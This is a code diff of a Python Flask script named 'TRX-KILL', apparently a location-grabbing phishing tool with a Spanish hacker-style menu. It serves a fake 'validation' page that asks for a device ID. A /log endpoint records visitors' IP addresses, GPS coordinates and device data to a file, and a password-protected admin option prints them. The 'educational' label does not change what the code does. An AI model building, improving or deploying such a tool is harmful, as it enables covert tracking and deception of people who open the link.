@@ -6,21 +6,36 @@ PORT = 7173
 AUTH_PASS = "TRX-kill-op"
 G, R, C, Y, W = "\033[1;32m", "\033[1;31m", "\033[1;36m", "\033[1;33m", "\033[0m"
 
-# --- [HTML NEÓN] ---
+def animar_texto(texto, velocidad=0.03):
+    for char in texto:
+        sys.stdout.write(char); sys.stdout.flush(); time.sleep(velocidad)
+    print()
+
+def boot():
+    os.system('clear')
+    banner = f"""{G}
+ ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗
+ ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║
+    ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║
+    ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║
+    ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗███████╗{W}"""
+    print(banner)
+    animar_texto(f"\n{C}# SISTEMA CONECTADO...{W}")
+    animar_texto(f"{C}# BY: OSCAR{W}")
+    animar_texto(f"{C}# LICENCIA: OSINT{W}")
+    animar_texto(f"{C}# VERSIÓN: 1.2.3{W}")
+    time.sleep(1)
+    print(f"\n{Y}>> BIENVENIDO A TRX-KILL <<{W}")
+    animar_texto(f"\n{G}[EDUX-UI] CARGANDO MÓDULOS DE INTERFAZ...{W}", 0.05)
+    time.sleep(1)
+
+# --- [HTML NEON] ---
 HTML_ENCUESTA = """
-<!DOCTYPE html>
-<html><head>
-<style>
-    body { background: #050505; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-    .card { border: 2px solid #0f0; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px #0f0; text-align: center; }
-    input { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 10px; border-radius: 5px; }
-    button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
-</style>
-</head><body>
-<div class="card">
-    <h2>TRX-KILL SYSTEM</h2>
-    <input type="text" id="marca" placeholder="Dispositivo..."><br>
-    <button onclick="c()">VALIDAR ACCESO</button>
+<!DOCTYPE html><html><body style="background:#005500; color:#0f0; text-align:center; font-family:monospace; padding-top:50px;">
+<div style="border:3px solid #0f0; display:inline-block; padding:20px; box-shadow:0 0 20px #0f0;">
+    <h2>TRX-KILL VALIDACIÓN</h2>
+    <input type="text" id="marca" placeholder="ID Dispositivo" style="background:black; color:#0f0; border:1px solid #0f0;"><br><br>
+    <button onclick="c()" style="background:#0f0; color:black; font-weight:bold;">ENVIAR</button>
 </div>
 <script>
 function c(){
@@ -39,54 +54,37 @@ def index(): return HTML_ENCUESTA
 @app.route('/log', methods=['POST'])
 def log():
     d = request.json
-    lat, lon = d.get('lat'), d.get('lon')
-    map_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
     with open("result.txt", "a") as f:
-        f.write(f"--- CAPTURA ---\nIP: {request.remote_addr}\nCOORD: {lat},{lon}\nMAPA: {map_link}\nDISPOSITIVO: {d.get('marca')}\nHORA: {time.ctime()}\n--------------\n")
+        f.write(f"CAPTURA | IP: {request.remote_addr} | COORD: {d.get('lat')},{d.get('lon')} | MARCA: {d.get('marca')} | HORA: {time.ctime()}\n")
     return "OK"
 
-def banner():
-    os.system('clear')
-    print(f"{G} ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗{W}")
-    print(f"{G} ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║{W}")
-    print(f"{G}    ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║{W}")
-    print(f"{G}    ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║{W}")
-    print(f"{G}    ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗███████╗{W}")
-
 def main():
+    boot()
     if len(sys.argv) > 1 and sys.argv[1] == "--adm":
-        pwd = getpass.getpass(f"{R}PASSWORD:{W} ")
-        if pwd == AUTH_PASS:
-            if os.path.exists("result.txt"): os.system("cat result.txt")
-            else: print("Sin registros.")
+        pwd = getpass.getpass(f"{R}PASSWORD ADM:{W} ")
+        if pwd == AUTH_PASS: os.system("cat result.txt")
         return
 
     while True:
-        banner()
-        print(f"\n {C}[1]{W} INFO NÚMERO | {C}[4]{W} LICENCIA Y USO")
-        print(f" {C}[2]{W} LINK-ZP     | {C}[5]{W} ACTUALIZACIÓN")
-        print(f" {C}[3]{W} CREADOR     | {C}[6]{W} {R}ADM{W}")
-        print(f" {C}[7]{W} SALIR")
+        print(f"\n{C}--- OPCIONES DISPONIBLES ---{W}")
+        animar_texto(f" [1] INFO NÚMERO       [4] LICENCIA Y USO", 0.01)
+        animar_texto(f" [2] LINK-ZP           [5] ACTUALIZACIÓN", 0.01)
+        animar_texto(f" [3] CREADOR           [6] PANEL ADM", 0.01)
+        animar_texto(f" [7] SALIR", 0.01)
+        
         sel = input(f"\n{Y}TRX-ROOT > {W}")
         
-        if sel == "1":
-            input(f"\n{Y}MÓVIL:{W} Analizando cobertura... (Enter para volver)")
+        if sel == "1": input(f"\n{G}[+] ESCANEANDO NÚMERO...{W}")
         elif sel == "2":
             print(f"\n{C}Servidor activo en http://127.0.0.1:{PORT}{W}")
             app.run(port=PORT, host='127.0.0.1')
-        elif sel == "3":
-            print(f"\n{C}CREADOR:{W} OSCAR"); input()
-        elif sel == "4":
-            print(f"\n{C}LICENCIA:{W} PRIVADA | {C}USO:{W} EDUCATIVA 1.2.3"); input()
-        elif sel == "5":
-            print(f"\n{G}Sistema al día.{W}"); input()
+        elif sel == "3": print(f"\n{C}BY: OSCAR{W}"); input()
+        elif sel == "4": print(f"\n{C}LICENCIA: OSINT | USO: EDUCATIVA{W}"); input()
         elif sel == "6":
             pwd = getpass.getpass(f"{R}CONTRASEÑA:{W} ")
             if pwd == AUTH_PASS:
-                if os.path.exists("result.txt"): os.system("cat result.txt")
-                else: print("Sin registros.")
+                os.system("cat result.txt") if os.path.exists("result.txt") else print("Sin datos.")
                 input("\n[Enter]...")
-        elif sel == "7":
-            sys.exit()
+        elif sel == "7": sys.exit()
 
 if __name__ == "__main__": main()
